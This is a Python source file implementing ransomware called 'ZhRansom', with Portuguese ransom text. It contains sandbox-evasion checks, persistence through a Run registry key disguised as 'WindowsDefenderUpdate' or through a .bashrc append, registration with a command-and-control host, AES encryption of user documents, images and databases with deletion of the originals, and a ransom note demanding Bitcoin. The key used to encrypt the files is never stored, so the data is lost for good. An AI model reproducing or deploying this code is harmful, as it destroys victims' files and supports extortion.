#Main.py
import os, sys, json, requests
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import winreg, ctypes, platform

class ZhRansom:
    def __init__(self):
        self.c2_url = "https://c2.zhrackservices[.]com"
        self.victim_id = None
        self.file_extensions = ['.doc', '.pdf', '.xls', '.jpg', '.png', '.sql', '.db']
        self.encrypted_marker = ".ZH_ENC"
        
        # Anti-analysis
        if self._check_virtual_env():
            sys.exit(0)
        
        
        self._establish_persistence()

    def _check_virtual_env(self):
        return any([
            os.path.exists("C:\\Windows\\System32\\vmware.exe"),
            "virtualbox" in platform.platform().lower(),
            "sandbox" in os.getenv("COMPUTERNAME", "").lower()
        ])

    def _establish_persistence(self):
        if platform.system() == 'Windows':
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "WindowsDefenderUpdate", 0,
                            winreg.REG_SZ, sys.argv[0])
        else:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"nohup {sys.executable} {__file__} &")

    def _generate_file_key(self):
        return get_random_bytes(16)

    def encrypt_file(self, file_path, key):
        try:
            cipher = AES.new(key, AES.MODE_GCM)
            with open(file_path, 'rb') as f:
                data = f.read()
            
            ciphertext, tag = cipher.encrypt_and_digest(data)
            
            with open(file_path + self.encrypted_marker, 'wb') as f:
                [ f.write(x) for x in (cipher.nonce, tag, ciphertext) ]
            
            os.remove(file_path)
        except Exception as e:
            pass

    def start_encryption(self):
        
        response = requests.post(f"{self.c2_url}/register")
        if response.status_code == 201:
            data = response.json()
            self.victim_id = data['victim_id']
            payment_address = data['payment_address']
            
            
            master_key = Fernet.generate_key()
            file_key = self._generate_file_key()
            
            
            for root, dirs, files in os.walk(os.path.expanduser("~")):
                for file in files:
                    if any(file.endswith(ext) for ext in self.file_extensions):
                        self.encrypt_file(os.path.join(root, file), file_key)
            
            
            ransom_note = f"""
            SEUS ARQUIVOS FORAM CIFRADOS!
            
            Para descriptografar:
            1. Envie 0.5 BTC para: {payment_address}
            2. Envie seu Victim ID: {self.victim_id}
            3. Execute o decryptor após pagamento
            """
            with open(os.path.expanduser("~/INSTRUCOES_DESCRIPTOGRAFIA.txt"), 'w') as f:
                f.write(ransom_note)

if __name__ == '__main__':
    ZhRansom().start_encryption()
